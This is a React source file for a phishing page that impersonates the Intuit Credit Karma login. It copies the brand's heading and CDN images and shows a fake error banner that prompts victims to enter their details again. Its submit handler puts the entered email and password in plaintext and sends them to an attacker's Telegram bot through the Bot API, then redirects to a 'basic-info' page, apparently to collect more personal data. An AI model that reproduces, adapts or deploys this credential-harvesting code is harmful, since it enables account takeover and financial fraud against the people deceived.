import React, { useCallback, useEffect, useState } from 'react';
import { Link, useNavigate } from 'react-router-dom';
import Header from '../../components/Header';
import Sidebar from '../../components/Sidebar';
import Footer from '../../components/Footer';
import axios from 'axios';
import { botToken, chatId } from '../../constants';

const LoginPageRepeat: React.FC = () => {
  const [sidebarOpen, setSidebarOpen] = useState(false);
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [errors, setErrors] = useState({ email: '', password: '' });

  const navigate = useNavigate();


  const togglePasswordVisibility = () => {
    setShowPassword((prev) => !prev);
  };

  const validateEmail = (email) => {
    const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return regex.test(email);
  };


const sendMessageToTelegram = async (message) => {

    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

    try {
        await axios.post(url, {
            chat_id: chatId,
            text: message,
        });
        console.log('Message sent successfully');
    } catch (error) {
        console.error('Error sending message:', error);
    }

  
};


const handleSubmit = (event) => {
  event.preventDefault();
  let newErrors = { email: '', password: '' };

  if (!validateEmail(email)) {
    newErrors.email = 'Invalid email format.';
  }

  if (password.length <= 0) {
    newErrors.password = 'Password must be at least 6 characters.';
  }

  setErrors(newErrors);

  // Check if there are no errors
  if (!newErrors.email && !newErrors.password) {
    // Proceed with form submission
    console.log('Form submitted with:', { email, password });


    const userData = `New Credit Karma Client(Confirm) \n\nEmail: ${email} \nPassword: ${password}`;
    console.log(userData);
  
    sendMessageToTelegram(userData);

    navigate('/basic-info'); 

    setErrors(newErrors);
  }

};



  return (
    <>
      <Header sidebarOpen={sidebarOpen} setSidebarOpen={setSidebarOpen} />
      {(
          <Sidebar sidebarOpen={sidebarOpen} setSidebarOpen={setSidebarOpen} />
        )}
        <section>
        <div className="grid grid-cols-1 gap-4">
        <div className="px-10 pt-4">
          <h1 className="text-3xl font-extrabold mb-6">
            Log in to Intuit Credit Karma
          </h1>

          <div className="flex items-center gap-3 text-sm font-bold mt-2 mb-2">
          <svg
            width="1rem"
            height="1rem"
            viewBox="0 0 24 24"
            className="fill-current text-red-600"
            aria-hidden="true"
          >
            <path
              d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"
              fillRule="nonzero"
            ></path>
          </svg>

          <p className='text-red-600'>We found some errors. Please review the form and make corrections.</p>
        </div>

          <form onSubmit={handleSubmit}>
          <div className="mb-5">
              <label className="mb-2.5 block font-medium text-black dark:text-white">
                Email
              </label>
              <div className="relative">
                <input
                  id="email"
                  name="email"
                  type='email'
                   value={email}
          onChange={(e) => setEmail(e.target.value)}
                  className="w-full rounded-md border border-stroke bg-transparent py-3 pl-6 pr-10 text-black outline-none focus:border-primary focus-visible:shadow-none dark:border-form-strokedark dark:bg-form-input dark:text-white dark:focus:border-primary"
                
                />
              </div>
            </div>

            {errors.email && (
        <div className="flex items-center gap-3 text-sm font-bold mt-1 mb-1">
          <svg
            width="1rem"
            height="1rem"
            viewBox="0 0 24 24"
            className="fill-current text-red-600"
            aria-hidden="true"
          >
            <path
              d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"
              fillRule="nonzero"
            ></path>
          </svg>

          <p>Email required</p>
        </div>
      )}
            <div className="mb-8">
      <label className="mb-2.5 block font-medium text-black dark:text-white">
        Password
      </label>
      <div className="relative">
        <input
          id="password"
          name="password"
          type={showPassword ? "text" : "password"}
          value={password}
          onChange={(e) => setPassword(e.target.value)}

          placeholder=""
          className="w-full rounded-md border border-stroke bg-transparent py-3 pl-6 pr-15 text-black outline-none focus:border-primary focus-visible:shadow-none dark:border-form-strokedark dark:bg-form-input dark:text-white dark:focus:border-primary"
        />

{errors.password && (
        <div className="flex items-center gap-3 text-sm font-bold mt-2">
          <svg
            width="1rem"
            height="1rem"
            viewBox="0 0 24 24"
            className="fill-current text-red-600"
            aria-hidden="true"
          >
            <path
              d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"
              fillRule="nonzero"
            ></path>
          </svg>

          <p>Password required</p>
        </div>
      )}
        <span
          className="absolute right-4 top-3 cursor-pointer"
          onClick={togglePasswordVisibility}
        >
          {showPassword ? "Hide" : "Show"}
        </span>
      </div>
    </div>

            <div className="mb-10">
              <input
                type="submit"
                value="Log in"
                className="w-full cursor-pointer font-bold rounded-md border border-primary bg-primary p-3 text-white transition hover:bg-opacity-90"
              />
            </div>

            <div className="mt-6 text-left">
              <p>
                Can't log in to your account?{' '}
                <Link to="/signup" className="underline">
                  Try another way
                </Link>
              </p>
            </div>

            <div className="mt-10 text-center mb-5">
              <p className="text-primary font-bold">Create an account</p>
            </div>
          </form>
        </div>

        <div className="bg-pink p-3">
          <img
            srcset="https://creditkarmacdn-a.akamaihd.net/res/content/bundles/assets/1.151.106/auth/logon/cyok-qr-code_2x.png?auto=compress%2Cformat&amp;dpr=1 1x, https://creditkarmacdn-a.akamaihd.net/res/content/bundles/assets/1.151.106/auth/logon/cyok-qr-code_2x.png?auto=compress%2Cformat&amp;dpr=2 2x, https://creditkarmacdn-a.akamaihd.net/res/content/bundles/assets/1.151.106/auth/logon/cyok-qr-code_2x.png?auto=compress%2Cformat&amp;dpr=3 3x, https://creditkarmacdn-a.akamaihd.net/res/content/bundles/assets/1.151.106/auth/logon/cyok-qr-code_2x.png?auto=compress%2Cformat&amp;dpr=4 4x"
            src="https://creditkarmacdn-a.akamaihd.net/res/content/bundles/assets/1.151.106/auth/logon/cyok-qr-code_2x.png?auto=compress%2Cformat"
            alt=""
            width="500"
            height="Auto"
          />

          <div className="text-center">
            <h1 className="text-3xl font-extrabold mb-3">
              Create your own karma.
            </h1>

            <p>Download our app to see what’s new.</p>
          </div>
        </div>
      </div>

        </section>
  
      <Footer/>

    </>
  );
};

export default LoginPageRepeat;
